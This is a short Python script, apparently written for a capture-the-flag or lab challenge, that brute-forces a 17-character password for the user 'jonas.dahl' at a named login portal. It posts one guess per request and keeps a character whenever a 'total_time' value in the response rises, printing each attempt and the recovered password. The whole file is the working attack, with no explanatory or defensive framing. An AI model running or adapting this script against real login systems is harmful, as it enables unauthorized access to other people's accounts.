import requests
import string

def authenticate(endpoint, user, passcode):
    payload = {"username": user, "password": passcode}
    response = requests.post(endpoint, json=payload)
    if response.ok:
        return response.json() if response.text else passcode
    return None

def find_password(endpoint, user):
    chars = string.ascii_letters + string.digits
    guess = "-" * 17
    for index in range(17):
        for char in chars:
            current_guess = list(guess)
            current_guess[index] = char
            current_guess = "".join(current_guess)
            print(f"Trying Character: {''.join(current_guess)}") 
            result = authenticate(endpoint, user, current_guess)
            if result:
                if isinstance(result, str):
                    return result
                elif result.get("total_time") > index + 1:
                    guess = current_guess
                    break
    return guess

# Parameters
endpoint = "https://portal.regjeringen.uiaikt.no/login"
user = "jonas.dahl"

print("Starting Timing Attack")
password = find_password(endpoint, user)
print(f'Found password: {password}')
